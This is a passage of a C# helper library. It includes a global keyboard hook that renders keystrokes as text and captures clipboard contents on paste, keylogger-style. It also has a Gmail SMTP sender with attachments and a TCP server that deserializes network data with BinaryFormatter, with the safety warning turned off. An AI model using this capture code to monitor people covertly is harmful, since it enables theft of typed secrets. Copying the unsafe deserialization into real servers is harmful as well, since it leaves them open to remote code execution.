                        string? keyText = await GetKeyTextAsync(key, Shift, Control, Alt, AltGr, CapsLock);
                        // Control, Shift, Alt, Alt Gr, Caps Lock, Num Lock, Key Text


                        bool isSpecial = Control || Shift || Alt || AltGr;

                        if (!isSpecial && OtherKeys.Contains(key)) OtherKeys.RemoveAt(Array.IndexOf(OtherKeys.ToArray(), key));
                        // Remove Key From List           

                        EventArgs eventArguments = new EventArgs(p.VirtualCode, Shift, Control, Alt, AltGr, CapsLock, NumLock, OtherKeys, keyText);
                        Action<EventArgs>? handler = isDown ? KeyDown : KeyUp;
                        handler?.Invoke(eventArguments);

                        if (isDown && !isSpecial && !OtherKeys.Contains(key)) OtherKeys.Add(key);
                        // ReAdd Key To List If Key Down

                        fEatKeyStroke = eventArguments.Handled;
                    }

                    return fEatKeyStroke ? (IntPtr)1 : CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
                }
            }

            #endregion


            #region Utilities

            #region Event Args

            public class EventArgs : HandledEventArgs
            {
                public Keys Key { get; }

                public bool Control { get; }
                public bool Shift { get; }
                public bool Alt { get; }
                public bool AltGr { get; }
                public bool CapsLock { get; }
                public bool NumLock { get; }
                public Keys[] OtherKeys { get; }

                public string? KeyText { get; }

                public int KeyValue { get; }

                public EventArgs(int VirtualCode, bool Shift, bool Control, bool Alt, bool AltGr, bool CapsLock, bool NumLock, List<Keys> OtherKeys, string? KeyText)
                {
                    Key = (Keys)VirtualCode;

                    this.Control = Control;
                    this.Shift = Shift;
                    this.Alt = Alt;
                    this.AltGr = AltGr;

                    this.CapsLock = CapsLock;
                    this.NumLock = NumLock;

                    this.OtherKeys = OtherKeys.ToArray();

                    this.KeyText = KeyText;

                    KeyValue = VirtualCode;
                }
            }

            #endregion

            #region Methods

            #region Get Key Text

            private async static Task<string?> GetKeyTextAsync(Keys key, bool Shift, bool Control, bool Alt, bool AltGr, bool CapsLock)
            {
                if (
                    key == Keys.Shift || key == Keys.ShiftKey || key == Keys.LShiftKey || key == Keys.RShiftKey ||
                    key == Keys.Control || key == Keys.ControlKey || key == Keys.LControlKey || key == Keys.RControlKey ||
                    key == Keys.Alt || key == Keys.Menu || key == Keys.LMenu || key == Keys.RMenu ||
                    key == Keys.NumLock || key == Keys.Capital || key == Keys.CapsLock
                    )
                    return null;

                bool isCapital = (CapsLock && !Shift) || (!CapsLock && Shift);

                if (Control && !AltGr && !Alt)
                {
                    if (!keyWithControl.TryGetValue(key, out string? controlKeyText)) return null;
                    if (!controlKeyText.Contains("<clipboard>")) return controlKeyText;

                    return controlKeyText.Replace("<clipboard>", await GetClipboardAsync() ?? "N/A");
                }
                // Control Overrides

                if (Shift && !Control && !AltGr && !Alt)
                {
                    if (keyWithShift.TryGetValue(key, out string? shiftKeyText)) return shiftKeyText;

                    return isCapital ? key.ToString().ToUpper() : key.ToString().ToLower();
                }
                // Shift Overrides

                if (AltGr)
                {
                    if (keyWithAltGr.TryGetValue(key, out string? altgrKeyText))
                        return isCapital ? altgrKeyText.ToUpper() : altgrKeyText.ToLower();

                    return isCapital ? key.ToString().ToUpper() : key.ToString().ToLower();
                }
                // Alt Gr Overrides

                if (!Control && !Shift && !AltGr && !Alt)
                {
                    if (keyDefault.TryGetValue(key, out string? keyText))
                        return isCapital ? keyText.ToUpper() : keyText.ToLower();

                    return isCapital ? key.ToString().ToUpper() : key.ToString().ToLower();
                }
                // Normal Keys

                return null;
            }

            private async static Task<string?> GetClipboardAsync()
            {
                return await Task.Run(() =>
                {
                    if (Clipboard.ContainsAudio()) return "Audio Stream";

                    else if (Clipboard.ContainsImage()) return "Image";

                    else if (Clipboard.ContainsFileDropList())
                    {
                        StringCollection files = Clipboard.GetFileDropList();

                        string r = files.Count == 1 ? "File:" : "File List:";
                        foreach (string? file in files) r += "\n- " + file;
                        return r;
                    }

                    else if (Clipboard.ContainsText()) return $"\"{Clipboard.GetText()}\"";

                    else return null;
                });
            }

            #endregion

            #region Setup Keys

            private static Dictionary<Keys, string> keyDefault = new Dictionary<Keys, string>();
            private static Dictionary<Keys, string> keyWithShift = new Dictionary<Keys, string>();
            private static Dictionary<Keys, string> keyWithAltGr = new Dictionary<Keys, string>();
            private static Dictionary<Keys, string> keyWithControl = new Dictionary<Keys, string>();

            private static void SetupKeys()
            {
                keyDefault.Add(Keys.Enter, "\n");
                keyDefault.Add(Keys.Space, " ");
                keyDefault.Add(Keys.NumPad0, "0");
                keyWithShift.Add(Keys.NumPad0, " [Insert] ");
                keyDefault.Add(Keys.NumPad1, "1");
                keyWithShift.Add(Keys.NumPad1, " [End] ");
                keyDefault.Add(Keys.NumPad2, "2");
                keyWithShift.Add(Keys.NumPad2, " [Arrow, Down] ");
                keyDefault.Add(Keys.NumPad3, "3");
                keyWithShift.Add(Keys.NumPad3, " [Page, Down] ");
                keyDefault.Add(Keys.NumPad4, "4");
                keyWithShift.Add(Keys.NumPad4, " [Arrow, Left] ");
                keyDefault.Add(Keys.NumPad5, "5");
                keyDefault.Add(Keys.NumPad6, "6");
                keyWithShift.Add(Keys.NumPad6, " [Arrow, Right] ");
                keyDefault.Add(Keys.NumPad7, "7");
                keyWithShift.Add(Keys.NumPad7, " [Home] ");
                keyDefault.Add(Keys.NumPad8, "8");
                keyWithShift.Add(Keys.NumPad8, " [Arrow, Up] ");
                keyDefault.Add(Keys.NumPad9, "9");
                keyWithShift.Add(Keys.NumPad9, " [Page, Up] ");
                keyDefault.Add(Keys.Add, "+");
                keyDefault.Add(Keys.Back, " [Backspace] ");
                keyDefault.Add(Keys.CapsLock, " [Caps Lock, State: <state>] ");
                keyDefault.Add(Keys.D0, "0");
                keyWithShift.Add(Keys.D0, "§");
                keyDefault.Add(Keys.D1, "1");
                keyWithShift.Add(Keys.D1, "'");
                keyDefault.Add(Keys.D2, "2");
                keyWithShift.Add(Keys.D2, "\"");
                keyDefault.Add(Keys.D3, "3");
                keyWithShift.Add(Keys.D3, "+");
                keyDefault.Add(Keys.D4, "4");
                keyWithShift.Add(Keys.D4, "!");
                keyDefault.Add(Keys.D5, "5");
                keyWithShift.Add(Keys.D5, "%");
                keyDefault.Add(Keys.D6, "6");
                keyWithShift.Add(Keys.D6, "/");
                keyDefault.Add(Keys.D7, "7");
                keyWithShift.Add(Keys.D7, "=");
                keyDefault.Add(Keys.D8, "8");
                keyWithShift.Add(Keys.D8, "(");
                keyDefault.Add(Keys.D9, "9");
                keyWithShift.Add(Keys.D9, ")");
                keyDefault.Add(Keys.Delete, " [Delete] ");
                keyDefault.Add(Keys.Divide, "÷");
                keyDefault.Add(Keys.Down, " [Arrow, Down] ");
                keyDefault.Add(Keys.End, " [End] ");
                keyDefault.Add(Keys.Escape, " [Esc] ");
                keyDefault.Add(Keys.Home, " [Home] ");
                keyDefault.Add(Keys.Insert, " [Insert] ");
                keyDefault.Add(Keys.Left, " [Arrow, Left] ");
                keyDefault.Add(Keys.LWin, " [Left Windows] ");
                keyDefault.Add(Keys.Multiply, "×");
                keyDefault.Add(Keys.Oemcomma, ",");
                keyWithShift.Add(Keys.Oemcomma, "?");
                keyWithAltGr.Add(Keys.Oemcomma, ";");
                keyDefault.Add(Keys.OemMinus, "-");
                keyWithShift.Add(Keys.OemMinus, "_");
                keyWithAltGr.Add(Keys.OemMinus, "*");
                keyDefault.Add(Keys.OemPeriod, ".");
                keyWithShift.Add(Keys.OemPeriod, ":");
                keyWithAltGr.Add(Keys.OemPeriod, ">");
                keyDefault.Add(Keys.PageDown, " [Page, Down] ");
                keyDefault.Add(Keys.PageUp, " [Page, Up] ");
                keyDefault.Add(Keys.PrintScreen, " [Print Screen] ");
                keyDefault.Add(Keys.Right, " [Arrow, Right] ");
                keyDefault.Add(Keys.RWin, " [Right Windows] ");
                keyDefault.Add(Keys.Subtract, "-");
                keyDefault.Add(Keys.Tab, " [Tab] ");
                keyDefault.Add(Keys.Up, " [Arrow, Up] ");
                keyDefault.Add(Keys.NumLock, " [Num Lock, State: <state>] ");

                // Alt Gr Keys, Different For Each Country
                keyWithAltGr.Add(Keys.S, "đ");
                keyWithAltGr.Add(Keys.F, "[");
                keyWithAltGr.Add(Keys.G, "]");
                keyWithAltGr.Add(Keys.K, "ł");
                keyWithAltGr.Add(Keys.L, "Ł");
                keyWithAltGr.Add(Keys.Y, ">");
                keyWithAltGr.Add(Keys.X, "#");
                keyWithAltGr.Add(Keys.C, "&");
                keyWithAltGr.Add(Keys.V, "@");
                keyWithAltGr.Add(Keys.B, "{");
                keyWithAltGr.Add(Keys.N, "}");
                keyWithAltGr.Add(Keys.Q, "\\");
                keyWithAltGr.Add(Keys.W, "|");
                keyWithAltGr.Add(Keys.U, "€");
                keyWithAltGr.Add(Keys.D1, "~");
                keyWithAltGr.Add(Keys.D2, "ˇ");
                keyWithAltGr.Add(Keys.D3, "^");
                keyWithAltGr.Add(Keys.D4, "˘");
                keyWithAltGr.Add(Keys.D5, "°");
                keyWithAltGr.Add(Keys.D6, "˛");
                keyWithAltGr.Add(Keys.D7, "`");
                keyWithAltGr.Add(Keys.D8, "˙");
                keyWithAltGr.Add(Keys.D9, "´");

                // Ctrl Keys, Mostly Good For Any Country
                keyWithControl.Add(Keys.A, " [Select All] ");
                keyWithControl.Add(Keys.C, " [Copy] ");
                keyWithControl.Add(Keys.V, " [Paste, Clipboard: <clipboard>] ");
                keyWithControl.Add(Keys.Z, " [Undo] ");
                keyWithControl.Add(Keys.F, " [Search] ");
                keyWithControl.Add(Keys.X, " [Cut] ");

                // Country Specific Keys
                keyDefault.Add(Keys.Oemtilde, "ö");
                keyWithShift.Add(Keys.Oemtilde, "Ö");
                keyWithAltGr.Add(Keys.Oemtilde, "˝");
                keyDefault.Add(Keys.OemQuestion, "ü");
                keyWithShift.Add(Keys.OemQuestion, "Ü");
                keyWithAltGr.Add(Keys.OemQuestion, "¨");
                keyDefault.Add(Keys.Oemplus, "ó");
                keyWithShift.Add(Keys.Oemplus, "Ó");
                keyDefault.Add(Keys.OemOpenBrackets, "ő");
                keyWithShift.Add(Keys.OemOpenBrackets, "Ő");
                keyWithAltGr.Add(Keys.OemOpenBrackets, "÷");
                keyDefault.Add(Keys.Oem6, "ú");
                keyWithShift.Add(Keys.Oem6, "Ú");
                keyWithAltGr.Add(Keys.Oem6, "×");
                keyDefault.Add(Keys.Oem1, "é");
                keyWithShift.Add(Keys.Oem1, "É");
                keyWithAltGr.Add(Keys.Oem1, "$");
                keyDefault.Add(Keys.OemQuotes, "á");
                keyWithShift.Add(Keys.OemQuotes, "Á");
                keyWithAltGr.Add(Keys.OemQuotes, "ß");
                keyDefault.Add(Keys.OemPipe, "ű");
                keyWithShift.Add(Keys.OemPipe, "Ű");
                keyWithAltGr.Add(Keys.OemPipe, "¤");
                keyDefault.Add(Keys.OemBackslash, "í");
                keyWithShift.Add(Keys.OemBackslash, "Í");
                keyWithAltGr.Add(Keys.OemBackslash, "<");
            }

            #endregion

            #endregion

            #endregion

        }

        #endregion

    }
}

#endregion


// Better OOP

#region => -E-Mail

namespace BekoS
{
    public static class EMail
    {

        #region Send E-Mail()

        public static void SendEMail(string EMail, string Password, string[] Recipients, string Subject = "", string HtmlBody = "", string[]? Attachments = null)
        {

            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Credentials = new NetworkCredential(EMail, Password),
                Port = 587,
                EnableSsl = true,
            };

            MailMessage mailMessage = new MailMessage
            {
                From = new MailAddress(EMail),
                Subject = Subject,
                Body = HtmlBody,
                IsBodyHtml = true,
            };

            if (Attachments is not null)
                foreach (string item in Attachments)
                    mailMessage.Attachments.Add(new Attachment(item));

            foreach (string recipient in Recipients)
                mailMessage.To.Add(recipient);

            smtpClient.Send(mailMessage);
        }

        #endregion

    }
}

#endregion


// new form

#region => -Popup

namespace BekoS
{
    public static class Popup
    {

        public static void Normal(object text, object? title = null)
        {
            text ??= string.Empty;
            title ??= string.Empty;
            MessageBox.Show(text.ToString(), title.ToString());
        }

        public static void Error(object text, object? title = null)
        {
            text ??= string.Empty;
            title ??= string.Empty;
            MessageBox.Show(text.ToString(), title.ToString(), MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

    }
}

#endregion


#region => -App

namespace BekoS
{
    public static class App
    {
        public static bool IsAlreadyRunning()
        {
            _ = new Mutex(true, $"S-[70740144-31c6-4847-8e4e-4b94173c0745]-[{Application.ProductName}]-S", out bool createdNew);
            return !createdNew;
        }

        public static void Exit() => Environment.Exit(0);

    }
}

#endregion


// Try catch, exception handling

// clientta, external ip alıp == 127.0.0.1 e eşitmi kontrolu yapmak kötü

// Client's "Connecter Timer" initialize on declaration not on method

/*
ConnectedClient DisconnectedClient = new ConnectedClient(this, TcpClient);
List<ConnectedClient> ClientList2 = new List<ConnectedClient>();
ClientList2 = Clients.ToList();
ConnectedClient ClientOfList2 = ClientList2.Find(client => client.IP == DisconnectedClient.IP && client.Port == DisconnectedClient.Port);

gibi şeylerde 2. satır gereksiz
*/

// "Max Client Connection" Prop For Server Class


// Test stop(), dispose(),   ( is it working properly with AutoReconnect in client side)



// Calculate ping for each client ( ConnectedClient.Ping; }) ( new Tcp.Client().Ping; )
// Ping Protocolü her X saniyede bir hesaplamak için


// ConnectedClient.Send / SendToClient ( Extension Method ( Server Side ) )


// Port Forwarder


// TCP.Client Client; Client.ConnectedServer.HostName etc... ( servers info )
// var host = Dns.GetHostName(ServerIP);

// StartByte to Password

// Validate Client Tek Taraflı Serverdan Ayarlama

// aes byte[] encryption with password prop
// add password to data start ( StartText to Password )

// serverde deserielize'da continue yerine error çeşidine göre error verme

//! Disabled Warnings For Unsafe Serialization/Deserialization ( Use Alternatives Instead )

#pragma warning disable SYSLIB0011
#region => -Tcp

namespace BekoS
{
    public static class Tcp
    {

        #region Server

        [Serializable]
        public class Server : IDisposable
        {
            public string IP { get; set; } = "Any";
            public int Port { get; set; }

            public int BufferSize { get; set; } = 64 * 1024;
            public string StartText { get; set; } = "S-Beko-S";

            public bool ValidateClient { get; set; }

            public bool IsClientConnected => Clients.Length != 0;
            public int ClientCount => Clients.Length;

            public ConnectedClient[] Clients { get; private set; } = Array.Empty<ConnectedClient>();
            private List<Socket> Sockets { get; set; } = new List<Socket>();


            public event Action<ConnectedClient>? ClientConnected;
            public event Action<ConnectedClient>? ClientDisconnected;
            public event Action<Message, ConnectedClient>? MessageReceived;


            public Server(int Port) => this.Port = Port;


            #region Start

            private TcpListener? TcpListener = null;
            public void Start()
            {
                IPAddress LocalIP = IP.ToLower() == "any" ? IPAddress.Any :
                    IP.ToLower() == "localhost" || IP.ToLower() == "local" ? IPAddress.Parse("127.0.0.1") :
                    IPAddress.Parse(IP);

                TcpListener = new TcpListener(LocalIP, Port);
                TcpListener.Start();

                Task.Run(() => { while (TcpListener is not null) ListenPort(); });
            }

            #endregion

            #region Stop / Dispose

            public void Stop()
            {
                TcpListener = null;
                Clients = Array.Empty<ConnectedClient>();
            }

            public void Dispose() => Stop();

            #endregion

            #region Disconnect

            public static void Disconnect(ConnectedClient client) => client.Disconnect();
            public static void Disconnect(ConnectedClient[] clients) { foreach (ConnectedClient client in clients) client.Disconnect(); }
            public void DisconnectAll() => Disconnect(Clients);

            #endregion

            #region Listen

            private void ListenPort()
            {
                Socket TcpClient = TcpListener!.AcceptSocket();
                TcpClient.ReceiveBufferSize = BufferSize;
                TcpClient.SendBufferSize = BufferSize;

                if (!ValidateClient)
                {
                    ConnectedClient Client = new ConnectedClient(this, TcpClient);
                    AuthenticateClient(TcpClient, Client);
                }

                Task.Run(() =>
                {
                    while (IsSocketConnected(TcpClient)) ListenClient(TcpClient);
                    // Listen Client If Connected

                    ConnectedClient? ClientOfList2 = null;
                    try
                    {
                        ConnectedClient DisconnectedClient = new ConnectedClient(this, TcpClient);
                        List<ConnectedClient> ClientList2 = new List<ConnectedClient>();
                        ClientList2 = Clients.ToList();
                        ClientOfList2 = ClientList2.Find(client => client.IP == DisconnectedClient.IP && client.Port == DisconnectedClient.Port);
                        // Get Client
                    }
                    catch { }

                    if (ClientOfList2 is null) return;
                    // Is Client Removed

                    ClientOfList2.Disconnect();
                    // Event => ClientDisconnected
                });
            }


            private BinaryFormatter BinaryFormatter = new BinaryFormatter() { Binder = new BindChanger() };
            private void ListenClient(Socket TcpClient)
            {
                byte[]? Data = null;
                try
                {
                    using (NetworkStream Stream = new NetworkStream(TcpClient))
                    using (MemoryStream ms = new MemoryStream())
                    {
                        byte[] startTextBytes = Encoding.UTF8.GetBytes(StartText);
                        byte[] HeaderBytes = new byte[startTextBytes.Length + 4];
                        int TempBytesRead = Stream.Read(HeaderBytes, 0, HeaderBytes.Length);

                        if (TempBytesRead != HeaderBytes.Length ||
                            !HeaderBytes.Take(startTextBytes.Length).SequenceEqual(startTextBytes))
                        {
                            byte[] buffer = new byte[BufferSize];
                            while (Stream.DataAvailable)
                            {
                                Stream.Read(buffer, 0, buffer.Length);
                            }
                            return;
                        }
                        // Read Header And If Not Readed Properly Reset Stream

                        int DataLength = BitConverter.ToInt32(HeaderBytes, startTextBytes.Length);

                        int BytesRead = 0;
                        byte[] TempData = new byte[BufferSize];
                        while (BytesRead < DataLength)
                        {
                            TempBytesRead = Stream.Read(TempData, 0, Math.Min(DataLength - BytesRead, BufferSize));
                            ms.Write(TempData, 0, TempBytesRead);

                            BytesRead += TempBytesRead;
                        }
                        // Read Data
                        Data = ms.ToArray();
                    }
                }
                catch { }
                if (Data is null || Data.Length == 0) return;
                // Get Message As Byte[]

                Message Message;
                using (var ms = new MemoryStream())
                {
                    ms.Write(Data, 0, Data.Length);
                    ms.Seek(0, SeekOrigin.Begin);

                    object Object;
                    try { Object = BinaryFormatter.Deserialize(ms); }
                    catch { return; }

                    Message = (Message)Object;
                }
                // Deserialize Message

                ConnectedClient SenderClient = new ConnectedClient(this, TcpClient);
                List<ConnectedClient> ClientList = new List<ConnectedClient>();
                ClientList = Clients.ToList();
                ConnectedClient? ClientOfList = ClientList.Find(client => client.IP == SenderClient.IP && client.Port == SenderClient.Port);

                bool isValidatedClient = ClientOfList is not null;
                if (isValidatedClient) SenderClient = ClientOfList!;
                // Get Client

                if (Message.Text == "[Server Protocol]") { StartProtocol(Message, TcpClient, SenderClient); return; }
                // Is Server Protocol

                if (!isValidatedClient)
                {
                    try { TcpClient.Shutdown(SocketShutdown.Both); }
                    finally { TcpClient.Close(); };

                    return;
                }
                // Disconnect If Not Validated

                MessageReceived?.Invoke(Message, SenderClient);
                // Event => MessageReceived
            }

            #endregion

            #region Send To Client

            #region String

            public void SendToAllClients(string Text) { SendParamsToClient(Clients, Text); }
            public void SendToClient(ConnectedClient Client, string Text) { SendParamsToClient(Client, Text); }
            public void SendToClient(ConnectedClient[] Clients, string Text) { SendParamsToClient(Clients, Text); }

            public void SendToAllClients(string Text, Image Image) { SendParamsToClient(Clients, Text, Image); }
            public void SendToClient(ConnectedClient Client, string Text, Image Image) { SendParamsToClient(Client, Text, Image); }
            public void SendToClient(ConnectedClient[] Clients, string Text, Image Image) { SendParamsToClient(Clients, Text, Image); }


            public void SendToAllClients(string Text, object Object) { SendParamsToClient(Clients, Text, Object); }
            public void SendToClient(ConnectedClient Client, string Text, object Object) { SendParamsToClient(Client, Text, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, object Object) { SendParamsToClient(Clients, Text, Object); }


            public void SendToAllClients(string Text, string Text2) { SendParamsToClient(Clients, Text, Text2); }
            public void SendToClient(ConnectedClient Client, string Text, string Text2) { SendParamsToClient(Client, Text, Text2); }
            public void SendToClient(ConnectedClient[] Clients, string Text, string Text2) { SendParamsToClient(Clients, Text, Text2); }


            public void SendToAllClients(string Text, string Text2, Image Image) { SendParamsToClient(Clients, Text, Text2, Image); }
            public void SendToClient(ConnectedClient Client, string Text, string Text2, Image Image) { SendParamsToClient(Client, Text, Text2, Image); }
            public void SendToClient(ConnectedClient[] Clients, string Text, string Text2, Image Image) { SendParamsToClient(Clients, Text, Text2, Image); }

            public void SendToAllClients(string Text, Image Image, string Text2) { SendParamsToClient(Clients, Text, Text2, Image); }
            public void SendToClient(ConnectedClient Client, string Text, Image Image, string Text2) { SendParamsToClient(Client, Text, Text2, Image); }
            public void SendToClient(ConnectedClient[] Clients, string Text, Image Image, string Text2) { SendParamsToClient(Clients, Text, Text2, Image); }


            public void SendToAllClients(string Text, string Text2, object Object) { SendParamsToClient(Clients, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, string Text, string Text2, object Object) { SendParamsToClient(Client, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, string Text2, object Object) { SendParamsToClient(Clients, Text, Text2, Object); }

            public void SendToAllClients(string Text, object Object, string Text2) { SendParamsToClient(Clients, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, string Text, object Object, string Text2) { SendParamsToClient(Client, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, object Object, string Text2) { SendParamsToClient(Clients, Text, Text2, Object); }


            public void SendToAllClients(string Text, string Text2, Image Image, object Object) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, string Text2, Image Image, object Object) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, string Text2, Image Image, object Object) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            public void SendToAllClients(string Text, string Text2, object Object, Image Image) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, string Text2, object Object, Image Image) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, string Text2, object Object, Image Image) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            public void SendToAllClients(string Text, Image Image, string Text2, object Object) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, Image Image, string Text2, object Object) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, Image Image, string Text2, object Object) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            public void SendToAllClients(string Text, object Object, string Text2, Image Image) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, object Object, string Text2, Image Image) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, object Object, string Text2, Image Image) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            public void SendToAllClients(string Text, Image Image, object Object, string Text2) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, Image Image, object Object, string Text2) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, Image Image, object Object, string Text2) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            public void SendToAllClients(string Text, object Object, Image Image, string Text2) { SendParamsToClient(Clients, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient Client, string Text, object Object, Image Image, string Text2) { SendParamsToClient(Client, Text, Text2, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, string Text, object Object, Image Image, string Text2) { SendParamsToClient(Clients, Text, Text2, Image, Object); }

            #endregion

            #region Image

            public void SendToAllClients(Image Image) { SendParamsToClient(Clients, Image); }
            public void SendToClient(ConnectedClient Client, Image Image) { SendParamsToClient(Client, Image); }
            public void SendToClient(ConnectedClient[] Clients, Image Image) { SendParamsToClient(Clients, Image); }


            public void SendToAllClients(Image Image, object Object) { SendParamsToClient(Clients, Image, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, object Object) { SendParamsToClient(Client, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, object Object) { SendParamsToClient(Clients, Image, Object); }


            public void SendToAllClients(Image Image, string Text) { SendParamsToClient(Clients, Image, Text); }
            public void SendToClient(ConnectedClient Client, Image Image, string Text) { SendParamsToClient(Client, Image, Text); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, string Text) { SendParamsToClient(Clients, Image, Text); }


            public void SendToAllClients(Image Image, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2); }
            public void SendToClient(ConnectedClient Client, Image Image, string Text, string Text2) { SendParamsToClient(Client, Image, Text, Text2); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2); }


            public void SendToAllClients(Image Image, string Text, object Object) { SendParamsToClient(Clients, Image, Text, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, string Text, object Object) { SendParamsToClient(Client, Image, Text, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, string Text, object Object) { SendParamsToClient(Clients, Image, Text, Object); }

            public void SendToAllClients(Image Image, object Object, string Text) { SendParamsToClient(Clients, Image, Text, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, object Object, string Text) { SendParamsToClient(Client, Image, Text, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, object Object, string Text) { SendParamsToClient(Clients, Image, Text, Object); }


            public void SendToAllClients(Image Image, string Text, string Text2, object Object) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, string Text, string Text2, object Object) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, string Text, string Text2, object Object) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            public void SendToAllClients(Image Image, object Object, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, object Object, Image Image, string Text, string Text2) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, Image Image, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            public void SendToAllClients(Image Image, string Text, object Object, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, string Text, object Object, string Text2) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, string Text, object Object, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            #endregion

            #region Object

            public void SendToAllClients(object Object) { SendParamsToClient(Clients, Object); }
            public void SendToClient(ConnectedClient Client, object Object) { SendParamsToClient(Client, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object) { SendParamsToClient(Clients, Object); }


            public void SendToAllClients(object Object, Image Image) { SendParamsToClient(Clients, Image, Object); }
            public void SendToClient(ConnectedClient Client, object Object, Image Image) { SendParamsToClient(Client, Image, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, Image Image) { SendParamsToClient(Clients, Image, Object); }


            public void SendToAllClients(object Object, string Text) { SendParamsToClient(Clients, Object, Text); }
            public void SendToClient(ConnectedClient Client, object Object, string Text) { SendParamsToClient(Client, Object, Text); }
            public void SendToClient(ConnectedClient[] Clients, object Object, string Text) { SendParamsToClient(Clients, Object, Text); }


            public void SendToAllClients(object Object, string Text, string Text2) { SendParamsToClient(Clients, Object, Text, Text2); }
            public void SendToClient(ConnectedClient Client, object Object, string Text, string Text2) { SendParamsToClient(Client, Object, Text, Text2); }
            public void SendToClient(ConnectedClient[] Clients, object Object, string Text, string Text2) { SendParamsToClient(Clients, Object, Text, Text2); }


            public void SendToAllClients(object Object, string Text, Image Image) { SendParamsToClient(Clients, Image, Text, Object); }
            public void SendToClient(ConnectedClient Client, object Object, string Text, Image Image) { SendParamsToClient(Client, Image, Text, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, string Text, Image Image) { SendParamsToClient(Clients, Image, Text, Object); }

            public void SendToAllClients(object Object, Image Image, string Text) { SendParamsToClient(Clients, Image, Text, Object); }
            public void SendToClient(ConnectedClient Client, object Object, Image Image, string Text) { SendParamsToClient(Client, Image, Text, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, Image Image, string Text) { SendParamsToClient(Clients, Image, Text, Object); }


            public void SendToAllClients(object Object, string Text, string Text2, Image Image) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, object Object, string Text, string Text2, Image Image) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, string Text, string Text2, Image Image) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            public void SendToAllClients(object Object, Image Image, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, Image Image, object Object, string Text, string Text2) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, Image Image, object Object, string Text, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            public void SendToAllClients(object Object, string Text, Image Image, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient Client, object Object, string Text, Image Image, string Text2) { SendParamsToClient(Client, Image, Text, Text2, Object); }
            public void SendToClient(ConnectedClient[] Clients, object Object, string Text, Image Image, string Text2) { SendParamsToClient(Clients, Image, Text, Text2, Object); }

            #endregion


            #region Send Message To Client

            private void SendParamsToClient(params object[] Params)
            {
                ConnectedClient[]? Targets = null;

                string? Text = null;
                string? Text2 = null;

                Image? Image = null;

                object? Object = null;


                bool IsText1 = false;
                bool IsTextFull = false;
                foreach (object Param in Params)
                {
                    if (Param is null) continue;

                    if (Param.GetType() == typeof(ConnectedClient))
                    {
                        Targets = new ConnectedClient[] { (ConnectedClient)Param };
                    }
                    else if (Param.GetType() == typeof(ConnectedClient[]))
                    {
                        Targets = (ConnectedClient[])Param;
                    }
                    // Target Clients

                    else if (Param.GetType() == typeof(string) && !IsTextFull)
                    {
